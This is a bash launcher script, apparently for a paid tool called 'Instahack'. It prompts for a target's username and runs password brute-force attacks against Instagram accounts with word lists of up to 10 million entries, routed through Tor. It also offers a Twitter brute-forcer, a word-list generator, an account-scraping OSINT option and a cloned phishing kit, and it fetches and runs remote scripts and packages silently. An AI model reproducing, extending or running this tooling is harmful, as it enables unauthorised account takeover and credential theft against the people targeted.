cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[0;33m'
BlueF='\e[1;34m' #Biru
RESET="\033[00m" #normal
orange='\e[38;5;166m'
clear
function UserDistro() {
lnx="Linux"
lsb_release -i >temp/distro.tmp >/dev/null 2>&1
lsb_release -c >temp/codename.tmp >/dev/null 2>&1
rlname=$(awk '{print $2}' temp/codename.tmp)
dist=$(awk '{print $3}' temp/distro.tmp)
dist1=$(awk '{print $4}' temp/distro.tmp)
rm -f temp/codename.tmp >/dev/null
rm -f temp/distro.tmp >/dev/null
if [[ "$dist" == "$lnx" ]]; then
dist0="$dist1"
else
dist0="$dist"
fi
}
function CheckInternet() {
clear
wget -q --spider https://google.com
if [ $? -ne 0 ]; then
echo ""
echo -e $red [ X ]::[INTERNET CONNECTION]: OFFLINE!
sleep 1
exit
else
echo ""
echo -e $okegreen [✔]::[INTERNET CONNECTION]: CONNECTED!
echo ""
sleep 1
fi
}
function updateVersion() {
path=$(pwd)
if [[ -r "${path}/release" ]]; then
Versi=$(sed -n 1p <"$path/release")
else
echo ""
echo -e "$red""* - Version Control File Not Found"
echo ""
if command -v pip3 >/dev/null 2>&1; then
if ! pip3 show hackerwasii >/dev/null 2>&1; then
echo -ne "$okegreen""* - Installing hackerwasii package ....."
pip3 install hackerwasii==2.0.7 >/dev/null 2>&1 || {
echo ""
echo -e "$red""* - Failed to install hackerwasii package"
return 1
}
fi
echo -ne "$okegreen""* - Updating Instahack Main Files ....."
wget https://raw.githubusercontent.com/evildevill/instahack/master/instahack.sh -O "${path}/instahack.sh" >/dev/null 2>&1 || {
echo ""
echo -e "$red""* - Failed to download instahack.sh file"
return 1
}
wget https://raw.githubusercontent.com/evildevill/instahack/master/setup.sh -O "${path}/setup.sh" >/dev/null 2>&1 || {
echo ""
echo -e "$red""* - Failed to download setup.sh file"
return 1
}
wget https://raw.githubusercontent.com/evildevill/instahack/master/release -O "${path}/release" >/dev/null 2>&1 || {
echo ""
echo -e "$red""* - Failed to download release file"
return 1
}
chmod +x "${path}/instahack.sh" >/dev/null 2>&1 || {
echo ""
echo -e "$red""* - Failed to set executable permission on instahack.sh"
return 1
}
chmod +x "${path}/setup.sh" >/dev/null 2>&1 || {
echo ""
echo -e "$red""* - Failed to set executable permission on setup.sh"
return 1
}
chmod +x "${path}/release" >/dev/null 2>&1 || {
echo ""
echo -e "$red""* - Failed to set executable permission on release"
return 1
}
else
echo ""
echo -e "$red""* - pip3 is not installed or not available"
return 1
fi
fi
}
function pswdCheck() {
if [[ -f ".b7bd6536bf9b3071c642718c7a514eac.txt" ]]; then
echo ""
Menu
else
echo -e "$orange" "  Licence Not Found in Database..:)"
echo ""
sleep 2.0
UserPswd
fi
}
function UserPswd() {
clear
echo ""
echo '
_           _        _                _
(_)         | |      | |              | |
_ _ __  ___| |_ __ _| |__   __ _  ___| | __
| | `_ \/ __| __/ _` | _ `\ / _` |/ __| |/ /
| | | | \__ \ || (_| | | | | (_| | (__|   <
|_|_| |_|___/\__\__,_|_| |_|\__,_|\___|_|\_\
version 4.5
' | lolcat
echo -e "${red}--------------------------------------------"
echo ""
echo -e "${white}[${red}•${white}] Note $cyan   : $orange Licence is Required in Order to use"
echo -e "${white}[${red}•${white}] Price  $cyan : $orange Price 23 USD For Lifetime"
echo -e "${white}[${red}•${white}] PayPal $cyan : $orange hackerbad669@gmail.com"
echo -e "${white}[${red}•${white}] Email $cyan  : $orange hackerwasi1@gmail.com"
echo ""
echo -e "${red}--------------------------------------------"
echo ""
while true; do
read -r -p $'\e[38;5;166mEnter Licence \e[0;36m: \e[1;37m' pswd
if [[ "$pswd" == "b7bd6536bf9b3071c642718c7a514eac" ]]; then
echo "" > ".b7bd6536bf9b3071c642718c7a514eac.txt"
echo -e $orange "Checking Licence..."
sleep 2.0
echo -e $orange "Key Matched..."
sleep 1
clear
echo -e $orange "Redirecting To Instahack...."
sleep 2.0
clear
UserName
Video
break
elif [[ -z "$pswd" ]]; then
echo -e $cyan "Please enter a valid license key."
else
echo -e $cyan "Licence Not Matched..:)"
sleep 1
exit
fi
done
}
function UserName() {
echo ""
echo ""
read -p $'\e[1;31m Enter Your Name \e[0;36m: \e[38;5;166m' nme
clear
echo ""
read -p $'\e[1;31m Your Target Name \e[0;36m: \e[38;5;166m' targ
sleep 2.0
clear
echo ""
echo -e $red "Hey, $orange"$nme" $red Important Note  for You.."
echo ""
echo -e $yellow "I shall not use Instahack to:"
echo -e $yellow "(1) upload or otherwise transmit, display or distribute any"
echo -e $yellow "content that infringes any trademark, trade secret, copyright"
echo -e $yellow "or other proprietary or intellectual property rights of any"
echo -e $yellow "person; (2) upload or otherwise transmit any material that contains"
echo -e $yellow "software viruses or any other computer code, files or programs"
echo -e $yellow "designed to interrupt, destroy or limit the functionality of any"
echo -e $yellow "computer software or hardware or telecommunications equipment;"
echo ""
echo -e $yellow "Thank you for all the sourport over the years, the Instahack team thanks you!"
echo -e $yellow "Follow Me On Instagram!!!"
echo ""
echo -e $yellow "[ https://instagram.com/wasii_254 ]"
echo ""
echo -e $yellow "Waseem Akram"
echo -e $cyan "Thanks, For Reading"
echo ""
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] You must agree to our terms and conditions first (Y/n) : \e[0m' option
if [[ $option == Y || $option == y ]]; then
echo ""
echo -e $orange "Thanks For Accepting Our Terms & Conditions.."
echo ""
sleep 1
clear
else
echo ""
echo -e $red "Exiting Have a Nice Day..:)"
echo ""
exit
sleep 2.0
fi
}
function Video() {
echo ""
echo -e $orange "Downloadin Main Files.."
export PATH=/home/$PATH/.local/bin:$PATH
pip3 install requests requests[socks] stem >/dev/null 2>&1
pip3 install hackerwasii==2.0.7 >/dev/null 2>&1
clear
instahack -cc -dc
sleep 2.0
clear
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Do You want to read the Blog (y/n) : \e[0m' vid
if [[ $vid == Y || $vid == y ]]; then
firefox https://hackerwasii.com/product >/dev/null 2>&1
am start -a android.intent.action.VIEW -d https://youtube.com/@hackerwasii >/dev/null 2>&1
echo ""
echo $targ >.targ.txt
echo $nme >.nme.txt
echo $pswd >.b7bd6536bf9b3071c642718c7a514eac.txt
echo $pswd >${path}/main/.b7bd6536bf9b3071c642718c7a514eac.txt
cd ${path}/main
Menu
else
echo ""
echo -e $red "Please Must Read The Blog.."
exit
fi
}
function Menu() {
echo ""
clear
echo ""
echo '
_           _        _                _
(_)         | |      | |              | |
_ _ __  ___| |_ __ _| |__   __ _  ___| | __
| | `_ \/ __| __/ _` | _ `\ / _` |/ __| |/ /
| | | | \__ \ || (_| | | | | (_| | (__|   <
|_|_| |_|___/\__\__,_|_| |_|\__,_|\___|_|\_\
version 4.6
' | lolcat
echo -e "${red}--------------------------------------------"
echo ""
echo -e "${white}[${red}•${white}] Author $cyan : $orange Waseem Akram"
echo -e "${white}[${red}•${white}] Github $cyan : $orange github.com/evildevill"
echo -e "${white}[${red}•${white}] Status $cyan : $BlueF Premium User"
echo ""
echo -e "${red}--------------------------------------------"
echo ""
echo -e "${white}(${cyan}1${white}) $orange Auto Attack       ${white}(${cyan}2${white}) $orange Insta OSINT"
echo -e "${white}(${cyan}3${white}) $orange Manual Attack     ${white}(${cyan}4${white}) $orange Create Worldlist"
echo -e "${white}(${cyan}5${white}) $orange Phishing Attack   ${white}(${cyan}6${white}) $orange Update"
echo -e "${white}(${cyan}7${white}) $orange About Us          ${white}(${cyan}8${white}) $orange Exit"
echo -e "${white}(${cyan}9${white}) $orange Resume Attack ${white}(${cyan}With Same UserName and Password List${white})"
echo -e "${white}(${cyan}0${white}) $orange Instahack Dump"
echo -e "${white}(${cyan}10${white}) $BlueF Do you want to Restart Instahack...?"
echo -e "${white}(${cyan}11${white}) $orange MutiThreder"
echo -e "${white}(${cyan}12${white}) $orange Twitter BruteForce"
echo ""
echo -e "${red}--------------------------------------------"
echo ""
read -p $'\e[38;5;166mSelect Option \e[0;36m: \e[1;37m' opt
echo ""
if [[ $opt == 1 || $opt == 01 ]]; then
AutoAttack
elif [[ $opt == 2 || $opt == 02 ]]; then
cd >/dev/null 2>&1
git clone https://github.com/evildevill/instainfo.git >/dev/null 2>&1
cd instainfo >/dev/null 2>&1
chmod +x * >/dev/null 2>&1
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
make
read -p $'\e[1;31m Your Target Name \e[0;36m: \e[38;5;166m' instain
cd instainfo >/dev/null 2>&1
python instainfo.py $instain
elif [[ $opt == 3 || $opt == 03 ]]; then
ManualAttack
elif [[ $opt == 4 || $opt == 04 ]]; then
echo ""
read -p $'\e[1;31m Enter Minimum Value \e[0;36m: \e[38;5;166m' min
read -p $'\e[1;31m Enter Maximum Value \e[0;36m: \e[38;5;166m' max
read -p $'\e[1;31m Enter Keyword \e[0;36m: \e[38;5;166m' keyword
echo -e $green"Please wait it will take some time.. $white"
echo ""
crunch $min $max $keyword -o ${path}/pass/pass.txt
sleep 2.0
clear
Menu
elif [[ $opt == 5 || $opt == 05 ]]; then
sleep 2.0
PhishingAttack
elif [[ $opt == 6 || $opt == 06 ]]; then
GitUpdate
elif [[ $opt == 7 || $opt == 07 ]]; then
cd ${path}/core
bash about.sh
elif [[ $opt == 8 || $opt == 08 ]]; then
echo -e $orange "Thanks For Using Instahack. Hope You Enjoyed it...��️"
exit
elif [[ $opt == 9 || $opt == 09 ]]; then
echo ""
ResumeAttack
elif [[ $opt == 10 || $opt == 10 ]]; then
echo -e $orange "Thanks For Using Instahack. Hope You Enjoyed it..."
bash instahack.sh
elif [[ $opt == 11 || $opt == 11 ]]; then
echo ""
MultiThrader
elif [[ $opt == 12 || $opt == 12 ]]; then
echo ""
TwitterBruteforce
elif [[ $opt == 0 || $opt == 0 ]]; then
read -p $'\e[1;31m Enter UserName \e[0;36m: \e[38;5;166m' userdump
instahack -i $userdump
echo ""
else
echo
printf "\e[1;93m [>!<] Invalid Selection!\e[0m\n"
sleep 1
echo
fi
exit
}
function AutoAttack() {
clear
echo ""
echo '
_____     _          _____ _   _           _
|  _  |_ _| |_ ___   |  _  | |_| |_ ___ ___| |_
|     | | |  _| . |  |     |  _|  _| .|  _ |   _|
|__|__|___|_| |___|  |__|__|_| |_| |__,|___|_,_|
' | lolcat
echo -e "${white}[${red}•${white}] Note $cyan : $BlueF First of all run Tor "
echo ""
echo -e "${red}--------------------------------------------"
echo ""
read -p $'\e[38;5;166mEnter Your Target Name \e[0;36m: \e[1;37m' targn
echo ""
echo -e $cyan "Select Worldlist $red : $white "
echo ""
echo -e "${white}[${red}1${white}] From $cyan : $orange 1k Passwords."
echo -e "${white}[${red}3${white}] From $cyan : $orange 1M Passwords."
echo -e "${white}[${red}4${white}] From $cyan : $orange 10M Passwords."
echo -e "${white}[${red}2${white}] From $cyan : $orange 10k Passwords."
echo ""
read -p $'\e[38;5;166mSelect One \e[0;36m: \e[1;37m' pswdLIST
echo ""
if [[ $pswdLIST = 1 ]]; then
export PATH=/home/$USER/.local/bin:$PATH
instahack --username $targn --password-list ${path}/pass/pass1.txt
elif [[ $pswdLIST = 2 ]]; then
export PATH=/home/$USER/.local/bin:$PATH
instahack --username $targn --password-list ${path}/pass/pass2.txt
elif [[ $pswdLIST = 3 ]]; then
export PATH=/home/$USER/.local/bin:$PATH
instahack --username $targn --password-list ${path}/pass/pass3.txt
elif [[ $pswdLIST = 4 ]]; then
export PATH=/home/$USER/.local/bin:$PATH
instahack --username $targn --password-list ${path}/pass/pass4.txt
else
echo ""
echo -e "$yellow >>> Exiting..! Bye See You Next Time :) <<<$cyan"
echo ""
sleep 1.0
exit
fi
}
function ManualAttack() {
clear
echo ""
echo '
_____                 _    _____ _   _           _
|     |___ ___ _ _ ___| |  |  _  | |_| |_ ___ ___| |_
| | | | . |   | | | . | |  |     |  _|  _| . |  _|  _|
|_|_|_|__,|_|_|___|__,|_|  |__|__|_| |_| |__,|___|_,_|
' | lolcat
echo ""
echo -e "${white}[${red}•${white}] Note $cyan : $BlueF First of all run Tor "
echo -e "${red}--------------------------------------------"
echo ""
read -p $'\e[38;5;166mEnter Your Target Name \e[0;36m: \e[1;37m' targn
echo ""
read -p $'\e[38;5;166m[#] Enter PasswordList Location \e[0;36m: \e[1;37m' manualpass
echo ""
if [[ $inspass = 0 ]]; then
echo -e "$ylo >>> Exiting..! Bye See You Next Time :) <<<$cyan"
else
export PATH=/home/$USER/.local/bin:$PATH
instahack --username $targn --password-list $manualpass
echo ""
fi
}
function PhishingAttack() {
clear
echo ""
echo '
_____ _   _     _   _            _____ _   _           _
|  _  | |_|_|___| |_|_|___ ___   |  _  | |_| |_ ___ ___| |_
|   __|   | |_ -|   | |   | . |  |     |  _|  _| . |  _|  _|
|__|  |_|_|_|___|_|_|_|_|_|_  |  |__|__|_| |_| |__,|___|_,_|
|___|
' | lolcat
echo ""
git clone https://github.com/evildevill/emptyphish >/dev/null 2>&1
cd ${path}/emptyphish
bash setup.sh >/dev/null 2>&1
bash emptyphish.sh
}
function GitUpdate() {
clear
echo ""
echo '
_____       _     _
|  |  |___ _| |___| |_ ___
|  |  | . | . | . |  _| -_|
|_____|  _|___|__,|_| |___|
|_|
' | lolcat
echo ""
echo -e "$red""* - An New Update of Instahack is Found"
echo ""
echo -ne "$okegreen""* - Updating Instahack Main Files ....."
rm -rf "${path}/instahack.sh" >/dev/null 2>&1
rm -rf "${path}/setup.sh" >/dev/null 2>&1
rm -rf "${path}/release" >/dev/null 2>&1
rm -rf "${path}/.2aa12920d338adf22bac634295f6e67c.txt" >/dev/null 2>&1
wget https://raw.githubusercontent.com/evildevill/instahack/master/instahack.sh -O "${path}/instahack.sh" >/dev/null 2>&1
wget https://raw.githubusercontent.com/evildevill/instahack/master/setup.sh -O "${path}/setup.sh" >/dev/null 2>&1
wget https://raw.githubusercontent.com/evildevill/instahack/master/release -O "${path}/release" >/dev/null 2>&1
pip3 install hackerwasii >/dev/null 2>&1
chmod +x "${path}/instahack.sh" >/dev/null 2>&1
chmod +x "${path}/setup.sh" >/dev/null 2>&1
chmod +x "${path}/release" >/dev/null 2>&1
echo ""
clear
echo -e "$orange" "Instahack Has been Updated Successfully..\n Now You can use."
sleep 2
echo ""
clear
exit 1
clear
sleep 5.0
bash instahack.sh
}
function ResumeAttack() {
clear
echo ""
echo '
░█▀▄░█▀▀░█▀▀░█░█░█▄█░█▀▀ ░ █▀█░▀█▀░▀█▀░█▀█░█▀▀░█░█
░█▀▄░█▀▀░▀▀█░█░█░█░█░█▀▀ ░ █▀█░░█░░░█░░█▀█░█░░░█▀▄
░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀░▀░▀▀▀ ░ ▀░▀░░▀░░░▀░░▀░▀░▀▀▀░▀░▀
instahck version 4.3
' | lolcat
echo ""
echo -e "${red}--------------------------------------------"
echo ""
read -p $'\e[38;5;166mEnter Your Target Name \e[0;36m: \e[1;37m' resumetarg
echo ""
read -p $'\e[38;5;166mPasswordlist Path \e[0;36m: \e[1;37m' resumepass
echo ""
if [[ $inspass = 0 ]]; then
echo -e "$ylo >>> Exiting..! Bye See You Next Time :) <<<$cyan"
else
export PATH=/home/$USER/.local/bin:$PATH
instahack --continue-attack --username $resumetarg --password-list $resumepass
echo ""
fi
}
function MultiThrader() {
clear
echo ""
sudo bash ${path}/main/.multithreading.sh
}
function TwitterBruteforce() {
clear
echo ""
sudo bash ${path}/main/.tweetbrute.sh
}
UserDistro
CheckInternet
updateVersion
pswdCheck
UserPswd
UserName
Video
Menu
AutoAttack
ManualAttack
PhishingAttack
GitUpdate
ResumeAttack
MultiThrader
TwitterBruteforce
